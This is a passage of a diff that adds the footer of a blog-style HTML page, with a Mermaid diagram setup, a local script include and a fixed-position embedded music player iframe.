+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
